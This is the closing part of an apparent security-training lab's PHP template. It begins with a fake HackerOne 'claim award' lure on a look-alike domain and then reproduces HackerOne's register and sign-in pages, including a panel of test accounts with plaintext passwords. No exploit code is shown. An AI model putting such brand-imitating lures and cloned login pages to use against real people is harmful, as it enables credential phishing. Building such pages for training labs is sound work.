        Verify Identity &amp; Claim Award →
      </button>
      <div class="atk-fine">By clicking you agree to our Terms of Service and Privacy Policy</div>
    </div>
    <div class="atk-footer">
      <span>hackerone-awards2020.com</span>
      <a href="#">Privacy Policy</a>
    </div>
  </div>
</div>

<?php elseif ($action === 'register'): ?>
<!-- ═══════════════════════════════════════════════════════════════════════════
     REGISTER PAGE
═══════════════════════════════════════════════════════════════════════════ -->
<nav class="mkt-nav">
  <div class="mkt-logo"><div class="mkt-logo-mark">h1</div><span class="mkt-logo-text">HackerOne</span></div>
  <div class="mkt-nav-links">
    <span class="mkt-nav-link">Hackers</span><span class="mkt-nav-link">Programs</span>
    <span class="mkt-nav-link">Resources</span><span class="mkt-nav-link">Company</span>
  </div>
  <div class="mkt-nav-right">
    <a href="<?php echo $labBase; ?>" class="mkt-btn-outline">Sign in</a>
  </div>
</nav>
<div class="si-wrap">
  <div class="si-left">
    <div class="si-left-logo"><div class="si-left-logo-mark">h1</div><span class="si-left-logo-text">HackerOne</span></div>
    <h1 class="si-tagline">Start hunting.<br><span>Get rewarded.</span></h1>
    <p class="si-sub">Join the world's largest community of security researchers. Find vulnerabilities, earn bounties, and build your reputation.</p>
    <div class="si-stats">
      <div class="si-stat"><div class="si-stat-num">$230M+</div><div class="si-stat-label">Bounties Paid</div></div>
      <div class="si-stat"><div class="si-stat-num">300K+</div><div class="si-stat-label">Hackers</div></div>
      <div class="si-stat"><div class="si-stat-num">1,400+</div><div class="si-stat-label">Programs</div></div>
      <div class="si-stat"><div class="si-stat-num">Free</div><div class="si-stat-label">To Join</div></div>
    </div>
  </div>
  <div class="si-right">
    <div class="si-form-wrap">
      <h2 class="si-form-title">Create your account</h2>
      <p class="si-form-sub">Already have one? <a href="<?php echo $labBase; ?>" style="color:#25a244;font-weight:600;">Sign in →</a></p>
      <?php if ($error): ?><div class="si-error"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>
      <form action="<?php echo $labBase; ?>?action=register" method="POST">
        <div class="si-field">
          <label class="si-label" for="rg-user">Username</label>
          <input class="si-input" type="text" id="rg-user" name="username" placeholder="your_handle" required>
        </div>
        <div class="si-field">
          <label class="si-label" for="rg-email">Email address</label>
          <input class="si-input" type="email" id="rg-email" name="email" placeholder="you@example.com" required>
        </div>
        <div class="si-field">
          <label class="si-label" for="rg-pass">Password</label>
          <input class="si-input" type="password" id="rg-pass" name="password" placeholder="Minimum 8 characters" required minlength="8">
        </div>
        <button type="submit" class="si-submit">Create account</button>
      </form>
      <div class="si-signup" style="margin-top:20px;font-size:.74rem;color:#bbb;">By creating an account you agree to our <a href="#" style="color:#25a244;">Terms of Service</a> and <a href="#" style="color:#25a244;">Privacy Policy</a>.</div>
    </div>
  </div>
</div>

<?php else: ?>
<!-- ═══════════════════════════════════════════════════════════════════════════
     SIGN-IN PAGE
═══════════════════════════════════════════════════════════════════════════ -->
<nav class="mkt-nav">
  <div class="mkt-logo"><div class="mkt-logo-mark">h1</div><span class="mkt-logo-text">HackerOne</span></div>
  <div class="mkt-nav-links">
    <span class="mkt-nav-link">Hackers</span><span class="mkt-nav-link">Programs</span>
    <span class="mkt-nav-link">Resources</span><span class="mkt-nav-link">Company</span>
  </div>
  <div class="mkt-nav-right">
    <a href="<?php echo $labBase; ?>" class="mkt-btn-outline">Sign in</a>
    <a href="<?php echo $labBase; ?>?action=register" class="mkt-btn-green">Get started</a>
  </div>
</nav>

<div class="si-wrap">
  <div class="si-left">
    <div class="si-left-logo"><div class="si-left-logo-mark">h1</div><span class="si-left-logo-text">HackerOne</span></div>
    <h1 class="si-tagline">The world's most trusted<br><span>hacker-powered security</span> platform.</h1>
    <p class="si-sub">Join over 300,000 hackers who work with the world's leading organizations to find critical vulnerabilities before the bad guys do.</p>
    <div class="si-stats">
      <div class="si-stat"><div class="si-stat-num">$230M+</div><div class="si-stat-label">Bounties Paid</div></div>
      <div class="si-stat"><div class="si-stat-num">300K+</div><div class="si-stat-label">Hackers</div></div>
      <div class="si-stat"><div class="si-stat-num">1,400+</div><div class="si-stat-label">Programs</div></div>
      <div class="si-stat"><div class="si-stat-num">120K+</div><div class="si-stat-label">Vulnerabilities</div></div>
    </div>
    <div class="si-trusted-label">Trusted by</div>
    <div class="si-trusted-logos">
      <span class="si-trusted-logo">Google</span><span class="si-trusted-logo">Twitter</span>
      <span class="si-trusted-logo">Shopify</span><span class="si-trusted-logo">Goldman Sachs</span>
      <span class="si-trusted-logo">Uber</span><span class="si-trusted-logo">Slack</span>
      <span class="si-trusted-logo">Microsoft</span>
    </div>
  </div>

  <div class="si-right">
    <div class="si-form-wrap">
      <h2 class="si-form-title">Sign in</h2>
      <p class="si-form-sub">New to HackerOne? <a href="<?php echo $labBase; ?>?action=register" style="color:#25a244;font-weight:600;">Create an account →</a></p>
      <?php if ($error): ?><div class="si-error"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>

      <div class="accs">
        <h4>📋 Test Accounts</h4>
        <div class="acc-r"><span class="ae">zara.hunt@hackerone.com</span><span class="ap">zara@123</span><span class="ab ab-user">User</span></div>
        <div class="acc-r"><span class="ae">noah.carter@hackerone.com</span><span class="ap">noah@123</span><span class="ab ab-user">User</span></div>
        <div class="acc-r"><span class="ae">ava.patel@hackerone.com</span><span class="ap">ava@123</span><span class="ab ab-user">User</span></div>
      </div>

      <form action="<?php echo $labBase; ?>" method="POST">
        <input type="hidden" name="authenticity_token" value="<?php echo htmlspecialchars($csrfToken); ?>">
        <input type="hidden" name="user[remember_me]" value="0">
        <div class="si-field">
          <label class="si-label" for="si-email">Email or username</label>
          <input class="si-input" type="text" id="si-email" name="user[email]" placeholder="you@example.com" autocomplete="username" required>
        </div>
        <div class="si-field">
          <div class="si-field-row">
            <label class="si-label" for="si-pass">Password</label>
            <a href="#" class="si-forgot">Forgot password?</a>
          </div>
          <input class="si-input" type="password" id="si-pass" name="user[password]" placeholder="••••••••••" autocomplete="current-password" required>
        </div>
        <label class="si-remember">
          <input type="checkbox" name="user[remember_me]" value="1"> Keep me signed in for 30 days
        </label>
        <button type="submit" class="si-submit">Sign in</button>
      </form>

      <div class="si-divider">OR</div>
      <button class="si-oauth si-oauth-github">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg>
        Sign in with GitHub
      </button>
      <button class="si-oauth" style="margin-top:0;">
        <svg width="16" height="16" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
        Sign in with Google
      </button>
      <a href="#" class="si-saml">Sign in with SAML SSO</a>
      <div class="si-signup">Don't have an account? <a href="<?php echo $labBase; ?>?action=register">Sign up for free</a></div>
    </div>
  </div>
</div>

<?php endif; ?>
</body>
</html>
